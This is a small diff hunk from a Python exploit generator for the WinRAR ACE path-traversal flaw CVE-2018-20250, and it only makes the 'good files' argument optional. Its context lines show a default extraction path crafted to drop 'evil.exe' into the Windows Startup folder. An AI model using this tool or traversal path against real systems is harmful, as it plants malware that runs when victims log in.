@@ -21,7 +21,7 @@ def getArgs():
     parser = argparse.ArgumentParser(description='Evil WinRAR Archive Generator (CVE-2018-20250) - Target: WinRAR < 5.70 beta 1\nBy @manulqwerty - ironhackers.es')
     parser.add_argument('-o',dest='filename',type=str,help='Output filename - Default: evil.rar',default='evil.rar')
     parser.add_argument('-e',metavar='evil_file',nargs='+', dest='evil',type=str,help='Evil files',required=True)
-    parser.add_argument('-g',metavar='good_file',nargs='+', dest='good',type=str,help='Good files',required=True)
+    parser.add_argument('-g',metavar='good_file',nargs='+', dest='good',type=str,help='Good files',required=False)
     parser.add_argument('-p',dest='path',type=str,help='Path to uncompress the evil files - Default: C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe',default='C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\')
     return parser.parse_args()
     
